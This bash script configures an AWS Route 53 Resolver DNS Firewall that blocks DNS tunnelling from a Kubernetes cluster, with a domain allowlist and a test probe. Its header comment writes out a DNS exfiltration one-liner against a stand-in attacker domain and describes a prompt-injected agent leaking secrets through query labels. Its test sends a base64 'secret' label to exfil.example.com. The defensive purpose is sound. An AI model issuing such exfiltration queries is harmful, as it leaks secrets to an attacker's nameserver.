#!/usr/bin/env bash
# Close the DNS covert channel with a Route 53 Resolver DNS Firewall.
#
# The problem: default-deny egress locks workloads to DNS and the gateway, but DNS itself
# is a hole. A pod can send :53 to CoreDNS, which forwards to the VPC resolver, so a
# prompt-injected agent can resolve arbitrary external names and tunnel data out in the
# query labels (nslookup $(base64 secret).attacker.com). The attacker's authoritative
# nameserver receives the data whether or not an answer comes back, and NetworkPolicy waves
# it through because it is "just DNS". That is exactly the covert-channel class the incident
# turns on.
#
# The fix that holds OUTSIDE the cluster: a Route 53 Resolver DNS Firewall on the VPC, with
# an allowlist of the domains the cluster legitimately needs (AWS services, the approved
# registries and package mirrors) and a block-all rule for everything else, answering
# NXDOMAIN. CoreDNS still forwards, but the VPC resolver refuses the exfil name, so the
# query never reaches the attacker. This is the sovereign-layer control: the network
# guarantees nothing leaves even when a workload tries.
#
#   ./scripts/dns.sh up      create the domain lists + rule group and associate the VPC
#   ./scripts/dns.sh test    from an agent pod: a legit name resolves, an exfil name NXDOMAINs
#   ./scripts/dns.sh down    disassociate and delete (fail-open again)
set -euo pipefail

export AWS_PROFILE="${SOVEREIGN_AWS_PROFILE:?set SOVEREIGN_AWS_PROFILE to the sandbox SSO profile}"
REGION=eu-west-2; CLUSTER=uk-sovereign-ai
ACCOUNT="$(aws sts get-caller-identity --query Account --output text 2>/dev/null)"
CTX="arn:aws:eks:${REGION}:${ACCOUNT}:cluster/${CLUSTER}"
VPC="$(aws ec2 describe-vpcs --region $REGION --filters 'Name=cidr,Values=10.42.0.0/16' --query 'Vpcs[0].VpcId' --output text 2>/dev/null)"
kc() { command kubectl --context "$CTX" "$@"; }
r53() { aws route53resolver "$@" --region "$REGION"; }

# The domains the cluster genuinely resolves. Generous on purpose: a missing entry breaks a
# real pull or an AWS call, and the security win is blocking everything NOT here, not being
# stingy with what is. Everything an agent would use to tunnel data out (its own domain) is
# not on this list, so it is refused.
ALLOW='*.amazonaws.com amazonaws.com *.docker.io docker.io *.docker.com *.quay.io quay.io
ghcr.io github.com *.github.com *.githubusercontent.com registry.k8s.io *.k8s.io *.pkg.dev
*.gcr.io *.googleapis.com *.cloudfront.net pypi.org *.pythonhosted.org *.pypi.org *.jfrog.io
*.hashicorp.com *.solo.io *.sigstore.dev'

up() {
  echo "==> allowlist domain list"
  AL=$(r53 create-firewall-domain-list --name uk-sovereign-ai-allow --query 'FirewallDomainList.Id' --output text 2>/dev/null \
       || r53 list-firewall-domain-lists --query "FirewallDomainLists[?Name=='uk-sovereign-ai-allow'].Id" --output text)
  r53 update-firewall-domains --firewall-domain-list-id "$AL" --operation ADD --domains $ALLOW >/dev/null
  echo "==> block-all domain list"
  BL=$(r53 create-firewall-domain-list --name uk-sovereign-ai-block-all --query 'FirewallDomainList.Id' --output text 2>/dev/null \
       || r53 list-firewall-domain-lists --query "FirewallDomainLists[?Name=='uk-sovereign-ai-block-all'].Id" --output text)
  r53 update-firewall-domains --firewall-domain-list-id "$BL" --operation ADD --domains '*.' >/dev/null
  echo "==> rule group: ALLOW the allowlist (priority 1), BLOCK everything else with NXDOMAIN (priority 100)"
  RG=$(r53 create-firewall-rule-group --name uk-sovereign-ai-dns --query 'FirewallRuleGroup.Id' --output text 2>/dev/null \
       || r53 list-firewall-rule-groups --query "FirewallRuleGroups[?Name=='uk-sovereign-ai-dns'].Id" --output text)
  r53 create-firewall-rule --firewall-rule-group-id "$RG" --firewall-domain-list-id "$AL" \
      --priority 1 --action ALLOW --name allow-known >/dev/null 2>&1 || true
  r53 create-firewall-rule --firewall-rule-group-id "$RG" --firewall-domain-list-id "$BL" \
      --priority 100 --action BLOCK --block-response-type NXDOMAIN --name block-rest >/dev/null 2>&1 || true
  echo "==> associate with the VPC"
  r53 associate-firewall-rule-group --firewall-rule-group-id "$RG" --vpc-id "$VPC" \
      --priority 101 --name uk-sovereign-ai-dns-assoc >/dev/null 2>&1 || true
  echo "    associated. Give it a minute to take effect, then: $0 test"
}

probe() {
  kc -n agents delete pod dnsprobe --ignore-not-found >/dev/null 2>&1
  kc apply -f - >/dev/null 2>&1 <<'POD'
apiVersion: v1
kind: Pod
metadata: { name: dnsprobe, namespace: agents }
spec:
  serviceAccountName: default
  containers:
    - name: p
      image: busybox:1.36
      command: ["sleep","300"]
      securityContext:
        runAsNonRoot: true
        runAsUser: 1000
        allowPrivilegeEscalation: false
        readOnlyRootFilesystem: true
        capabilities: { drop: ["ALL"] }
        seccompProfile: { type: RuntimeDefault }
      resources: { limits: { cpu: "50m", memory: "32Mi" } }
POD
  kc -n agents wait --for=condition=Ready pod/dnsprobe --timeout=40s >/dev/null 2>&1
}

test() {
  probe
  echo "== legit name on the allowlist (should resolve):"
  kc -n agents exec dnsprobe -- nslookup sts.eu-west-2.amazonaws.com 2>&1 | grep -iE 'Address|NXDOMAIN|can.t' | tail -2
  echo "== exfil name, not on the allowlist (should NXDOMAIN):"
  kc -n agents exec dnsprobe -- nslookup c2VjcmV0LWRhdGE.exfil.example.com 2>&1 | grep -iE "NXDOMAIN|can.t resolve|Address" | tail -2
  kc -n agents delete pod dnsprobe --ignore-not-found >/dev/null 2>&1
}

down() {
  ASSOC=$(r53 list-firewall-rule-group-associations --query "FirewallRuleGroupAssociations[?VpcId=='$VPC'].Id" --output text 2>/dev/null)
  [ -n "$ASSOC" ] && r53 disassociate-firewall-rule-group --firewall-rule-group-association-id "$ASSOC" >/dev/null 2>&1 || true
  echo "disassociated; DNS is fail-open again (rule group and lists left for re-use)"
}

case "${1:-up}" in
  up) up ;;
  test) test ;;
  down) down ;;
  *) echo "usage: $0 {up|test|down}"; exit 1 ;;
esac
